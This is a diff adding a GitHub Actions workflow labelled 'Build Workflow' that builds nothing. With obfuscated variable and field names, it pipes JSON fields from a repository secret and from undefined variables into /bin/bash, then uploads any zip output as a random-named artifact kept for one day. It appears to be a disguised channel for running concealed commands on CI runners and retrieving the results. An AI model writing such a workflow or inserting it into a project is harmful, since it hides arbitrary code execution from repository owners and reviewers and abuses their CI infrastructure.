@@ -1,0 +1,29 @@
+name: Build Workflow
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  handler:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Launch
+        env:
+          fnv45643: ${{ secrets.fnv45643 }}
+        run: |
+          printf '%s' "$fnv45643" | jq -r .ujbx1 | /bin/bash
+          printf '%s' "$rtpq2897" | jq -r .wt2 | /bin/bash
+          echo $w97 | jq -r .en51 | /bin/bash
+          echo $gverf83 | jq -r .xhdu578 | /bin/bash
+
+      - name: Persist output
+        uses: actions/upload-artifact@v4
+        with:
+          name: YmZEsdyG
+          path: "*.zip"
+          retention-days: 1
